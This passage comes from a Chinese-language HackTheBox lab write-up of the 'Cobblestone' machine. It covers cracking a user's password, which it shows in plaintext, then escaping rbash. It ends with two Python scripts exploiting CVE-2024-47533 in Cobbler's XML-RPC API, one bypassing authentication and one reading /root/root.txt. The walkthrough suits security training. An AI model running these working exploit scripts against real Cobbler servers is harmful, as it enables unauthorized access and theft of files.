\u003e8\u003c/span\u003e   |\n+----+-----------------------+-----------------------+-----------------------+-----------------------------+-------+------------------------------------------------------------------+--------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有 \u003ccode\u003ecobble\u003c/code\u003e 用户，破解一下其密码\u003c/p\u003e\n\u003cp\u003e得到密码 \u003ccode\u003eiluvdannymorethanyouknow\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功登录 \u003ccode\u003eSSH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且能读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ecobble@cobblestone:~$ cat user.txt                                                                                                                                                             \nf86xxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003erbash\u003c/h3\u003e\n\u003cp\u003e能注意到我们当前 \u003ccode\u003eshell\u003c/code\u003e 是 \u003ccode\u003erbash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ecobble@cobblestone:~$ sudo -l                                                                                                                                                                  \n-rbash: sudo: command not found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试了一下并无法逃逸，回到 \u003ccode\u003ewww-data\u003c/code\u003e，因为它是正常 \u003ccode\u003ebash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后在 \u003ccode\u003eHome\u003c/code\u003e 目录能找到 \u003ccode\u003echroot_jail\u003c/code\u003e 并且发现 \u003ccode\u003ecobble\u003c/code\u003e 只能用下边几个命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ewww-data@cobblestone:/home/chroot_jail$ ls\nbin  dev  etc  home  lib  lib64  proc\nwww-data@cobblestone:/home/chroot_jail$ cd bin/\nwww-data@cobblestone:/home/chroot_jail/bin$ ls\ncat  grep  ls  ps  rbash  ss\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能还是兔子洞，没找任何方法可以跳出 \u003ccode\u003erbash\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eCobbler\u003c/h3\u003e\n\u003cp\u003e我们回到 \u003ccode\u003ewww-data\u003c/code\u003e 进行操作\u003c/p\u003e\n\u003cp\u003e查看正在监听端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ewww-data@cobblestone:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/vote$ ss -tulpn\nNetid              State               Recv-Q              Send-Q                           Local Address:Port                              Peer Address:Port              Process              \nudp                UNCONN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                                      \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e                                     \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:*                                      \nudp                UNCONN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                                         [::]:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e                                        [::]:*                                      \ntcp                LISTEN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e511\u003c/span\u003e                                    \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                                     \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:*                                      \ntcp                LISTEN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e                                    \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                                     \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:*                                      \ntcp                LISTEN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e                                    \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25151\u003c/span\u003e                                  \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:*                                      \ntcp                LISTEN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                                   \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e                                   \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:*                                      \ntcp                LISTEN              \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                   \u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e                                       [::]:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                                        [::]:*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现本地还开启着 \u003ccode\u003e25151\u003c/code\u003e 端口，经过查阅，能发现是 \u003ccode\u003ecobbler\u003c/code\u003e 的 \u003ccode\u003eRPC\u003c/code\u003e 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查阅 \u003ccode\u003ecobbler\u003c/code\u003e 漏洞，能找到 \u003ccode\u003eCVE-2024-47533\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h\"\u003ehttps://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e可以利用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ewww-data@cobblestone:/tmp$ cat /etc/cobbler/version\n[cobbler]\ngitdate = ?\ngitstamp = ?\nbuilddate = Mon Sep \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\nversion = \u003cspan class=\"hljs-number\"\u003e3.3\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e\nversion_tuple = [\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/python3\u003c/span\u003e\n\nimport ssl\nimport xmlrpc.client\n\nparams = { \u003cspan class=\"hljs-string\"\u003e'proto'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'host'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'127.0.0.1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'port'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'25151'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e }\nssl_context = ssl.\u003cspan class=\"hljs-title function_ invoke__\"\u003e_create_unverified_context\u003c/span\u003e()\n\nurl = \u003cspan class=\"hljs-string\"\u003e'{proto}://{host}:{port}/'\u003c/span\u003e.\u003cspan class=\"hljs-title function_ invoke__\"\u003eformat\u003c/span\u003e(**params)\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ssl_context:\n    conn = xmlrpc.client.\u003cspan class=\"hljs-title function_ invoke__\"\u003eServerProxy\u003c/span\u003e(url, context=ssl_context)\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n    conn = xmlrpc.client.\u003cspan class=\"hljs-title function_ invoke__\"\u003eServer\u003c/span\u003e(url)\n\n\u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e:\n    token = conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003elogin\u003c/span\u003e(params[\u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e], params[\u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e])\nexcept xmlrpc.client.Fault \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e e:\n    \u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Failed to log in to Cobbler '{url}' as '{username}'. {error}\"\u003c/span\u003e.\u003cspan class=\"hljs-title function_ invoke__\"\u003eformat\u003c/span\u003e(url=url, error=e, **params))\nexcept \u003cspan class=\"hljs-built_in\"\u003eException\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e e:\n    \u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Connection to '{url}' failed. {error}\"\u003c/span\u003e.\u003cspan class=\"hljs-title function_ invoke__\"\u003eformat\u003c/span\u003e(url=url, error=e, **params))\n\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Login success!\"\u003c/span\u003e)\n\nsystem_id = conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003enew_system\u003c/span\u003e(token)\n\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_distros\u003c/span\u003e())\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_profiles\u003c/span\u003e())\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_systems\u003c/span\u003e())\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_images\u003c/span\u003e())\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(conn.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_repos\u003c/span\u003e())\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以成功登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ewww-data@cobblestone:/tmp$ python3 test.py\nLogin success!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e现在的思路应该是通过 \u003ccode\u003ecobbler\u003c/code\u003e 的 \u003ccode\u003eRPC\u003c/code\u003e 接口进行利用\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/cobbler/cobbler/wiki/XMLRPC-API\"\u003ehttps://github.com/cobbler/cobbler/wiki/XMLRPC-API\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e可以通过 \u003ccode\u003eRPC API\u003c/code\u003e 创建新实例\u003c/p\u003e\n\u003cp\u003e通过恶意调用方法可以造成任意文件读取漏洞\u003c/p\u003e\n\u003cp\u003e前面是都是正常的配置，主要的配置是倒数第四和第二行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eimport xmlrpc.client\n\n\u003cspan class=\"hljs-comment\"\u003e# 任意\u003c/span\u003e\nKERNEL = \u003cspan class=\"hljs-string\"\u003e\"/boot/vmlinuz-6.1.0-37-amd64\"\u003c/span\u003e\nINITRD = \u003cspan class=\"hljs-string\"\u003e\"/boot/initrd.img-6.1.0-37-amd64\"\u003c/span\u003e\nTARGET = \u003cspan class=\"hljs-string\"\u003e\"/root/root.txt\"\u003c/span\u003e\nNAME   = \u003cspan class=\"hljs-string\"\u003e\"pwnsys\"\u003c/span\u003e\nDEST   = \u003cspan class=\"hljs-string\"\u003e\"/leak\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 利用 CVE-2024-47533\u003c/span\u003e\nsrv = xmlrpc.client.\u003cspan class=\"hljs-title function_ invoke__\"\u003eServerProxy\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"http://127.0.0.1:25151/\"\u003c/span\u003e, allow_none=True)\ntok = srv.\u003cspan class=\"hljs-title function_ invoke__\"\u003elogin\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# 创建新实例\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 设置参数（随意）\u003c/span\u003e\ndid = srv.\u003cspan class=\"hljs-title function_ invoke__\"\u003enew_distro\u003c/span\u003e(tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_distro\u003c/span\u003e(did, \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"pwn_distro\"\u003c/span\u003e, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_distro\u003c/span\u003e(did, \u003cspan class=\"hljs-string\"\u003e\"kernel\"\u003c/span\u003e, KERNEL, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_distro\u003c/span\u003e(did, \u003cspan class=\"hljs-string\"\u003e\"initrd\"\u003c/span\u003e, INITRD, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003esave_distro\u003c/span\u003e(did, tok)\n\npid = srv.\u003cspan class=\"hljs-title function_ invoke__\"\u003enew_profile\u003c/span\u003e(tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_profile\u003c/span\u003e(pid, \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"pwn_profile\"\u003c/span\u003e, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_profile\u003c/span\u003e(pid, \u003cspan class=\"hljs-string\"\u003e\"distro\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"pwn_distro\"\u003c/span\u003e, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003esave_profile\u003c/span\u003e(pid, tok)\n\nsid = srv.\u003cspan class=\"hljs-title function_ invoke__\"\u003enew_system\u003c/span\u003e(tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_system\u003c/span\u003e(sid, \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e, NAME, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_system\u003c/span\u003e(sid, \u003cspan class=\"hljs-string\"\u003e\"profile\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"pwn_profile\"\u003c/span\u003e, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003emodify_system\u003c/span\u003e(sid, \u003cspan class=\"hljs-string\"\u003e\"template_files\"\u003c/span\u003e, {\u003cspan class=\"hljs-attr\"\u003eTARGET\u003c/span\u003e: DEST}, tok)\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003esave_system\u003c/span\u003e(sid, tok)\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e(srv.\u003cspan class=\"hljs-title function_ invoke__\"\u003eget_template_file_for_system\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"pwnsys\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"/leak\"\u003c/span\u003e))\nsrv.\u003cspan class=\"hljs-title function_ invoke__\"\u003esync\u003c/span\u003e(tok)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后利用的接口是：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","updated":"2025-08-11","tags":["HackTheBox","linux","RPC","SQLInjection","Cobbler","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Cobblestone\n\n https://app.hackthebox.com/machines/Cobblestone | `Linux` | `Insane`\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n`80` 端口\n\n\n\n有三个功能，皮肤数据库，vote 投票，Deploy 服务器\n\n并且 皮肤数据库 和 投票的用户是分开的，两边都要重新注册\n\n然后这...","isEncrypted":true},"recentPosts":[{"id":"Sunshine + moonlight 息屏串流方案","title":"Sunshine + moonlight 息屏串流方案","date":"2025-10-18","isEncrypted":false,"year":"2025","month":"10","day":"18"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title
